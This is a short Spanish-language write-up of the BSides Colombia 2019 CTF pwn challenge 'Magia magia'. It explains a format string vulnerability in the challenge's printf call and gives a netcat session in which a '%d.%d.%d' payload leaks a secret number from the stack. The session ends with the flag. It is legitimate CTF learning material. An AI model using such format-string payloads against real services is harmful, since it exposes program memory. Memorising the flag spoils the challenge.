# __BSides Colombia 2019__
## _Magia magia_

 ## Información 
**Categoría:** | **Writeup Author**
--- | ---
Pwn | Huascar Tejeda <<htejeda@f2tc.com>>

**Descripción:**

> Hay quienes leen mentes y otros leen memorias ;)
> retos.bsides.ctf.co:31333
>
> [chall](magia.c)

**Bandera:**

> BSidesCo{m4gi4_MAG1a-b5G_BU6}

## Solución

Luego de leer el código fuente provisto, pudimos notar que el programador utilizó `printf` de manera incorrecta haciendo el programa vulnerable a un format string attack. Con este format string podemos leer el contenido de `secretnum`.

```
❯❯❯ nc retos.bsides.ctf.co 31333
Prueba que eres mago y lees mentes!
Primero dime tu nombre (hasta 10 letras):
%d.%d.%d
Estoy pensando un numero entre 0 y 1000000, puedes decirme cual es?
1646996036.744.638161
has tu prediccion: 638161
Sorprendente! Aca esta la bandera: BSidesCo{m4gi4_MAG1a-b5G_BU6}
```